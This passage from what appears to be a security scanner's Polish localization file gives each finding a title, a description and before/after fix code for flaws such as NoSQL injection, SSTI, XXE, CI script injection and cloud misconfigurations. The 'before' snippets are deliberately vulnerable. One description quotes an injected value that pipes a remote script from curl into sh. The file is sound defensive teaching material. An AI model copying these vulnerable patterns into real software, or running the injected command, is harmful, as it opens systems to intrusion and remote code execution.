      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Ścieżka niedozwolona")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Wartość wprowadzona przez użytkownika jest wykonywana jako kod wewnątrz zapytania MongoDB",
    description:
      "Operator $where w MongoDB uruchamia JavaScript po stronie serwera dla każdego dokumentu — jeśli ten ciąg znaków jest budowany przez konkatenację wartości pochodzącej od użytkownika, osoba nim sterująca może spowodować wykonanie dowolnego kodu w kontekście bazy danych, a nie tylko zmienić filtr jak przy zwykłym SQL injection.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Wartość wprowadzona przez użytkownika jest interpretowana jako szablon, a nie jako dane",
    description:
      "Funkcja kompilująca/renderująca szablon otrzymuje CAŁY szablon z wartości żądania, zamiast używać stałego szablonu i przekazywać tylko dane. Atakujący może pisać bezpośrednio w składni silnika szablonów (np. {{7*7}} dla Jinja2) i wykonać kod na serwerze — Server-Side Template Injection, co często prowadzi do wykonania dowolnych poleceń, a nie tylko problemu z wyświetlaniem jak przy XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "Parser XML można zmusić do odczytu plików lub wysyłania zewnętrznych żądań",
    description:
      "Parser XML (DocumentBuilderFactory) jest tworzony bez jawnego wyłączenia zewnętrznych encji (DOCTYPE) w pobliskich liniach. Jeśli parser otrzyma XML z niezaufanego źródła, atakujący może zdefiniować zewnętrzną encję, aby odczytać pliki na serwerze lub zmusić go do skontaktowania się z wybranym przez siebie adresem — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Sekret jest zapisany bezpośrednio w instrukcji ENV lub ARG w Dockerfile",
    description:
      "Zmienna o nazwie typu password/secret/token/key ma wartość literalną w instrukcji ENV lub ARG. W przeciwieństwie do pliku .env (który zwykle nie trafia do obrazu), ta wartość zostaje zaszyta w samym obrazie Docker — każdy, kto może go pobrać lub sprawdzić historię warstw, może ją odzyskać, nawet jeśli linia zostanie usunięta w późniejszej wersji Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# przekazywane z: docker build --build-arg DB_PASSWORD=*** (lub, jeszcze lepiej,\n# za pomocą secret mount BuildKit, który nigdy nie trafia do historii warstw)`,
    },
  },
  "k8s-privileged-container": {
    title: "Kontener w manifeście Kubernetes działa jako privileged",
    description:
      '"privileged: true" w securityContext kontenera wyłącza niemal całą zwykłą izolację między kontenerem a hostem: kontener może uzyskać dostęp do urządzeń hosta, zmienić jego konfigurację sieciową, a w wielu przypadkach faktycznie zyskać dostęp root na maszynie, która go uruchamia. Prawie nigdy niepotrzebne dla zwykłej aplikacji.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # tylko naprawdę potrzebne capabilities`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Sekret jest zapisany jawnie w zmiennej env manifestu Kubernetes",
    description:
      'Zmienna środowiskowa o nazwie typu password/secret/token/key ma wartość literalną ("value:") zamiast być odczytywana z Secret ("valueFrom.secretKeyRef"). Sam manifest — często zacommitowany do repozytorium — zawiera więc sekret jawnie, widoczny nawet dla kogoś, kto może tylko odczytać konfigurację, niekoniecznie wykonywać polecenia w klastrze.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "Security group w Terraform otwiera wrażliwy port na cały internet",
    description:
      'Reguła z "cidr_blocks" obejmującym 0.0.0.0/0 (dowolny adres IP) znajduje się blisko wrażliwego portu — SSH (22), RDP (3389) lub typowego portu bazy danych (MySQL, Postgres, MongoDB, Redis, SQL Server). Każdy w internecie może spróbować połączyć się z tą usługą, nie tylko ten, kto powinien.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # tylko twoja prywatna sieć albo bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Reguła zapory Google Cloud otwiera wrażliwy port na cały internet",
    description:
      'Zasób "google_compute_firewall" z "source_ranges" obejmującym 0.0.0.0/0 (dowolny adres IP) zezwala na ruch do wrażliwego portu — SSH (22), RDP (3389) lub typowego portu bazy danych (MySQL, Postgres, MongoDB, Redis, SQL Server). Każdy w internecie może spróbować połączyć się z tą usługą, nie tylko ten, kto powinien.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # tylko twoja prywatna sieć albo bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Reguła sieciowa Azure otwiera wrażliwy port na cały internet",
    description:
      'Reguła zabezpieczeń sieciowych ("azurerm_network_security_rule" lub blok "security_rule" wewnątrz "azurerm_network_security_group") z "source_address_prefix" ustawionym na "*" lub "0.0.0.0/0", kierunkiem "Inbound" i dostępem "Allow", blisko wrażliwego portu — SSH (22), RDP (3389) lub typowego portu bazy danych. Każdy w internecie może spróbować połączyć się z tą usługą, nie tylko ten, kto powinien.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # tylko twoja prywatna sieć albo bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Sekret jest zapisany jako domyślna wartość zmiennej Terraform",
    description:
      'Zmienna o nazwie typu password/secret/token/key ma wartość literalną w swoim "default". W przeciwieństwie do wartości przekazywanej w czasie wykonania (tfvars, zmienne środowiskowe TF_VAR_*), wartość domyślna trafia do kodu źródłowego — a jeśli repozytorium jest współdzielone lub publiczne, każdy ją widzi, nawet bez dostępu do stanu Terraform.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # brak wartości domyślnej: należy przekazać przez plik .tfvars (poza gitem) lub zmienną środowiskową TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Wartość kontrolowana przez zewnętrznego użytkownika trafia bezpośrednio do polecenia shell w CI",
    description:
      'Polecenie "run:" w workflow GitHub Actions bezpośrednio interpoluje wartość taką jak tytuł pull requesta, nazwa brancha lub tekst komentarza — wszystkie zapisywalne przez każdego, kto otworzy pull request lub komentarz, nawet z zewnętrznego forka. Wartość taka jak `"; curl malware.sh | sh #` wykonałaby dowolne polecenia w CI, z dostępem do wszystkich sekretów dostępnych w tym workflow.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # przekazywane jako zmienna środowiskowa, nigdy interpolowane bezpośrednio w poleceniu`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Workflow uruchamia kod zewnętrznego pull requesta z dostępem do sekretów repozytorium",
    description:
      'Workflow używa "pull_request_target" — który działa z uprawnieniami i sekretami repozytorium bazowego nawet dla pull requesta otwartego z niepowiązanego forka — i wykonuje checkout kodu samego pull requesta ("github.event.pull_request.head"), a nie brancha bazowego. Osoba otwierająca pull request faktycznie uzyskuje uruchomienie własnego kodu z dostępem do tych sekretów.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Wykonuje checkout brancha bazowego, a nie kodu PR — albo użyj\n      # "pull_request" zamiast "pull_request_target", jeśli nie potrzebujesz\n      # szerszych uprawnień/sekretów.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Dane żądania są deserializowane w formacie, który może wykonać kod",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) lub biblioteka node-serialize (Node) deserializują wartość pobraną bezpośrednio z żądania. W przeciwieństwie do JSON, te formaty mogą reprezentować i wykonywać kod podczas samej deserializacji — osoba kontrolująca wysłaną wartość może uzyskać wykonanie dowolnego kodu na serwerze.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON nigdy nie wykonuje kodu podczas parsowania, w przeciwieństwie do pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Kod jawnie akceptuje niepodpisane tokeny JWT (algorytm "none")',
    description:
      '"none" pojawia się wśród algorytmów akceptowanych do weryfikacji tokenu JWT. Token z algorytmem "none" nie ma żadnego podpisu do zweryfikowania: każdy może zbudować taki token z dowolną zawartością (np. rolą administratora), a kod zaakceptuje go jako prawidłowy.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // nigdy nie dodawaj "none" do akceptowanych algorytmów`,
    },
  },
  "unprotected-new-table": {
    title: "Nowa tabela wygląda na utworzoną bez zabezpieczenia",
    description:
      "Migracja SQL tworzy tabelę, ale nie włącza Row Level Security dla tej samej tabeli w tym samym pliku. Dopóki tak pozostaje, tabela powstaje bez żadnego ograniczenia dotyczącego tego, kto może ją odczytywać lub do niej zapisywać.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Witryna akceptuje żądania z dowolnej innej witryny",
    description:
      "Nagłówek CORS jest ustawiony tak, by akceptować żądania z dowolnego źródła (*), albo middleware cors() jest używany bez ograniczeń. Dowolna witryna osób trzecich może wywoływać twoje API z przeglądarki już uwierzytelnionego użytkownika.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://twojawitryna.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Funkcja z uprawnieniami administratora nie sprawdza, kto jej używa",
    description:
      "Trasa lub funkcja, której nazwa sugeruje operacje administracyjne, nie zawiera w pobliskich liniach żadnego sprawdzenia uwierzytelniania ani roli. Każdy, kto zna URL, mógłby ją uruchomić.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Witrynę można zmusić do wykonania zewnętrznego kodu",
    description:
      "Wychodzące żądanie HTTP (fetch, axios) bezpośrednio używa wartości pochodzącej z żądania użytkownika jako docelowego URL. Złośliwy użytkownik może zmusić twój serwer do wywoływania wewnętrznych lub dowolnych adresów — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.twojausluga.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL niedozwolony")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Hasła są chronione metodą, którą łatwo teraz złamać",
    description:
      "W tej samej linii, md5() lub sha1() są stosowane do wartości powiązanej z hasłem. Te algorytmy są zbyt szybkie do obliczenia: atakujący z bazą danych może wypróbować miliardy haseł na sekundę.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "Kontener w manifeście Kubernetes jest ustawiony tak, by działać jako root",
    description:
      '"runAsUser: 0" lub "runAsNonRoot: false" w securityContext jawnie wymuszają uruchomienie kontenera jako root. Jeśli atakujący zdoła uruchomić kod w kontenerze (np. wykorzystując podatną bibliotekę), bycie rootem w kontenerze ułatwia ewentualną ucieczkę do hosta lub szerszy wpływ.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Kontener w manifeście Kubernetes może zyskać więcej uprawnień niż miał na starcie",
    description:
      '"allowPrivilegeEscalation: true" w securityContext pozwala procesowi wewnątrz kontenera zyskać więcej uprawnień niż proces, który go uruchomił (np. przez binarkę z bitem setuid). W połączeniu z podatnością w aplikacji to kolejny krok w stronę wykonania kodu z większymi uprawnieniami niż zamierzone.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Pod w manifeście Kubernetes współdzieli sieć, procesy lub pamięć współdzieloną hosta",
    description:
      '"hostNetwork", "hostPID" lub "hostIPC" ustawione na true wyprowadzają pod poza jego normalną izolację: hostNetwork wystawia pod w sieci hosta (omijając polityki sieciowe klastra), hostPID daje mu widoczność wszystkich procesów na maszynie hosta, hostIPC daje mu dostęp do pamięci współdzielonej hosta. Prawie nigdy niepotrzebne dla zwykłej aplikacji — typowo tylko dla niskopoziomowych narzędzi systemowych/monitorujących.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access jest wyłączone na buckecie S3 zdefiniowanym w Terraform",
    description:
      'Jedna lub więcej z czterech zabezpieczeń w "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) jest ustawiona na false. Nie oznacza to, że bucket jest już publiczny, ale usuwa siatkę bezpieczeństwa, która zapobiegałaby przypadkowemu upublicznieniu go w przyszłości.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Polityka IAM zdefiniowana w Terraform przyznaje pełny dostęp",
    description:
      'Statement z akcją "*" i zasobem "*" przyznaje pełny dostęp do każdej usługi i zasobu AWS — to samo sprawdzenie wykonywane już na żywym stanie IAM, tutaj odczytywane bezpośrednio z kodu jeszcze przed jego zastosowaniem. Może to być zamierzone dla roli awaryjnej, ale warto to potwierdzić: do codziennego użytku przyznawaj tylko naprawdę potrzebne uprawnienia.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::twoj-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Bucket Google Cloud Storage jest udostępniony do odczytu każdemu",
    description:
      'Zasób "google_storage_bucket_iam_member" lub "google_storage_bucket_iam_binding" przyznaje rolę "allUsers" lub "allAuthenticatedUsers" — pierwsza sprawia, że bucket jest czytelny dla każdego w internecie, nawet bez konta Google; druga dla każdego z dowolnym kontem Google, a nie tylko dla tych, którzy powinni mieć dostęp.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:ktos@example.com"  # tylko ten, kto naprawdę powinien mieć dostęp, nie allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Publiczny dostęp do blobów jest włączony na koncie magazynu Azure",
    description:
      '"allow_blob_public_access" jest ustawione na true na "azurerm_storage_account": każdy, kto zna URL udostępnionego publicznie bloba/kontenera, może go odczytać, bez żadnego uwierzytelniania.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Rola IAM Google Cloud przyznaje pełny dostęp (Owner/Editor)",
    description:
      '"google_project_iam_binding"/"google_project_iam_member" (lub odpowiednik na poziomie organizacji/folderu) przypisuje podstawową rolę "roles/owner" lub "roles/editor" — niemal pełny dostęp do każdej usługi w projekcie. Może to być zamierzone dla konta awaryjnego, ale warto to potwierdzić: do codziennego użytku przyznawaj tylko bardziej szczegółowe, predefiniowane role, które są naprawdę potrzebne.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # tylko predefiniowana rola, która jest naprawdę potrzebna, nie roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Przypisanie roli Azure przyznaje pełny dostęp (Owner)",
    description:
      '"azurerm_role_assignment" przypisuje rolę "Owner" — pełny dostęp, łącznie z kontrolą nad uprawnieniami innych użytkowników, w całym przypisanym zakresie (subskrypcja, grupa zasobów...). Może to być zamierzone dla konta awaryjnego, ale warto to potwierdzić: do codziennego użytku przyznawaj tylko bardziej szczegółową rolę, która jest naprawdę potrzebna (np. "Contributor" na pojedynczej grupie zasobów).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # tylko bardziej szczegółowa rola, która jest naprawdę potrzebna, nie Owner na całej subskrypcji\n}`,
    },
  },
  "weak-random-token": {
    title: "Token bezpieczeństwa jest generowany za pomocą generatora liczb losowych, który nie jest kryptograficznie bezpieczny",
    description:
      "Wartość o nazwie typu token/session/reset/otp/csrf jest generowana za pomocą Math.random() (JS), random.random() (Python) lub rand() (PHP) — generatorów nieprzeznaczonych do celów bezpieczeństwa, których sekwencje są przewidywalne. Token wygenerowany w ten sposób można odgadnąć lub zrekonstruować, co niweczy cel, dla którego istnieje (np. link do resetu hasła, który każdy mógłby przewidzieć).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, nie Math.random — nieprzewidywalne`,
    },
  },
  "ldap-injection": {
    title: "Filtr LDAP jest budowany przez bezpośrednią konkatenację wartości żądania",
    description:
      'Linia budująca filtr LDAP (np. "(uid=...)") bezpośrednio zawiera wartość pobraną z żądania, bez żadnego escapowania znaków specjalnych LDAP. Osoba kontrolująca tę wartość może zmienić logikę filtra — na przykład ominąć sprawdzenie uwierzytelniania lub odczytać dane katalogu, których nie powinna widzieć.',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // znaki specjalne LDAP zawsze trzeba escapować przed użyciem ich w filtrze\nclient.search(base, { filter });",
    },
  },
  "xss-dangerous-html": {
    title: "Tekst napisany przez użytkowników mógłby wykonać kod w przeglądarce",
    description:
      "Treść jest wstawiana na stronę jako surowy HTML (dangerouslySetInnerHTML, v-html, .innerHTML) zamiast jako zwykły tekst. Jeśli ta treść zawiera dane wejściowe użytkownika, może zawierać skrypty, które wykonują się w przeglądarce osoby czytającej stronę.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// albo, jeśli potrzebny jest HTML: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "Przestrzeń na przesłane pliki jest widoczna dla każdego",
    description:
      "Bucket magazynu (Supabase Storage, S3) jest skonfigurowany jako publiczny. Jeśli zawiera dokumenty, zdjęcia lub pliki przesłane przez użytkowników, każdy, kto zna — lub odgadnie — ścieżkę, może uzyskać do nich dostęp bez uwierzytelniania.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// serwuj pliki za pomocą podpisanych URL-i ograniczonych czasowo: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Wystarczy jeden link, by usunąć lub zmienić dane",
    description:
      "Trasa GET wykonuje operację zmieniającą dane (ścieżka zawiera delete/remove/update/edit). Żądania GET wykonują się już przez samo odwiedzenie linku lub załadowanie obrazka z zewnętrznej witryny — to klasyczny punkt zaczepienia dla ataku CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Dane logowania zapisane w przeglądarce nie są dobrze zabezpieczone",
    description:
      "Token dostępu jest zapisywany w localStorage. W przeciwieństwie do ciasteczka httpOnly, dowolny skrypt uruchomiony na stronie (łącznie ze złośliwym, wstrzykniętym przez XSS) może go odczytać i wykraść.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// ustaw token jako ciasteczko httpOnly po stronie serwera:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Witrynę można wykorzystać do przekierowania na fałszywą stronę",
    description:
      "Witryna przekierowuje użytkownika na adres pobrany bezpośrednio z żądania (query, body, params) bez sprawdzenia, czy jest to znana domena. Link, który wygląda, jakby prowadził do twojej witryny, może w rzeczywistości prowadzić do strony phishingowej.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Zmiana liczby w adresie mogłaby pokazać cudze dane",
    description:
      "Zapytanie do bazy danych bezpośrednio używa identyfikatora pobranego z URL (req.params.id) bez sprawdzenia, w pobliskich liniach, czy należy on do użytkownika wysyłającego żądanie. Zmiana id w adresie mogłaby dać dostęp do danych innego użytkownika — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "header-injection": {
    title: "Wartość żądania trafia bezpośrednio do nagłówka odpowiedzi HTTP",
    description:
      "Nagłówek odpowiedzi HTTP jest ustawiany wartością pobraną bezpośrednio z żądania (query, body, params), bez sprawdzenia, czy nie zawiera znaku nowej linii (CRLF). Atakujący może wstawić dodatkowe nagłówki lub nawet całkowicie inną odpowiedź — response splitting — co pozwala manipulować cache'em, ciasteczkami lub treścią pokazywaną innym użytkownikom.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfile nie ustawia użytkownika innego niż root",
    description:
      "Brak instrukcji USER w Dockerfile: bez niej kontener działa jako root. Jeśli atakujący zdoła uruchomić kod wewnątrz kontenera (np. wykorzystując podatną bibliotekę), bycie rootem w kontenerze ułatwia ewentualną ucieczkę do hosta lub szerszy wpływ na otaczający system.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Manifest Kubernetes jawnie nie wymusza uruchamiania jako użytkownik inny niż root",
    description:
      'Brak "runAsNonRoot" w manifeście (ani na poziomie poda, ani kontenera): bez jego ustawienia kontener działa jako użytkownik zdefiniowany w jego obrazie — często domyślnie root, jeśli sam obraz tego nie zmienił. Ustawienie go jawnie na true powoduje, że pod nie uruchomi się, jeśli obraz mimo wszystko próbuje działać jako root, zamiast odkryć to dopiero po incydencie.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "Zewnętrzna akcja CI nie jest przypięta do precyzyjnej wersji (commit SHA)",
    description:
      'Workflow używa zewnętrznej akcji wskazywanej przez tag lub branch (np. "@v1", "@main") zamiast przez commit SHA. Osoba ją utrzymująca — lub ktoś, kto przejmie jej konto — może w dowolnym momencie przenieść to odniesienie na inny commit, cicho zmieniając to, co działa w CI, z dostępem do jego sekretów. Commit SHA zawsze wskazuje dokładnie ten sam kod.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, przypięte do commit SHA — zaktualizuj SHA przy aktualizacji wersji`,
    },
  },
  "gha-excessive-permissions": {
    title: "Workflow przyznaje sobie wszystkie uprawnienia tokenu zamiast tylko tych, z których korzysta",
    description:
      '"permissions: write-all" przyznaje GITHUB_TOKEN workflow dostęp zapisu do wszystkiego — issues, pull requestów, pakietów, wdrożeń — nawet jeśli workflow korzysta tylko z części tego. Jeśli jeden z kroków workflow zostanie naruszony (złośliwa zależność, wstrzyknięty skrypt), te szersze uprawnienia zwiększają to, co może zrobić osoba, która to wykorzysta.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # tylko uprawnienia, z których workflow naprawdę korzysta`,
    },
  },
  "insecure-cookie-flags": {
    title: "Ciasteczko sesji lub uwierzytelniania jest ustawione bez flag Secure i HttpOnly",
    description:
      'Ciasteczko o nazwie przypominającej session/auth/token jest ustawione bez "httpOnly" i "secure" wśród swoich opcji. Bez httpOnly, JavaScript na stronie — łącznie z kodem wstrzykniętym przez XSS — może to ciasteczko odczytać. Bez secure może też zostać wysłane przez nieszyfrowane połączenie HTTP.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "no-login-rate-limit": {
    title: "Formularz logowania nie blokuje zbyt wielu prób z rzędu",
    description:
      "Trasa logowania jest zdefiniowana w pliku, ale nie ma śladu middleware'u rate-limiting w tym samym pliku. Bez limitu prób atakujący może kolejno próbować haseł (brute force) bez żadnego spowolnienia.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Hasła lub wrażliwe dane trafiają do logów",
    description:
      "Wywołanie console.log (lub podobne) zawiera zmienną o nazwie password, token, secret lub apiKey. Jeśli te logi trafią do zewnętrznej usługi lub pliku, wrażliwe dane pozostają widoczne znacznie dłużej niż to konieczne.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Obraz bazowy Dockerfile używa tagu ":latest"',
    description:
      'Instrukcja FROM jawnie używa tagu ":latest" zamiast precyzyjnej wersji. "latest" zmienia się w czasie: ten sam build, wykonany ponownie w innym momencie, może dostać inną wersję obrazu bazowego — niemożliwy do odtworzenia build, a niechciana aktualizacja może nadejść bez decyzji nikogo.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile pobiera zdalny plik za pomocą ADD zamiast COPY",
    description:
      "Instrukcja ADD z URL-em http/https pobiera plik z internetu podczas builda, bez sprawdzenia integralności i bez widoczności zawartości w repozytorium. Jeśli ten URL zostanie kiedyś naruszony, build wchłonie dowolną zawartość bez wiedzy kogokolwiek czytającego Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<oczekiwany hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Podatna zależność:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
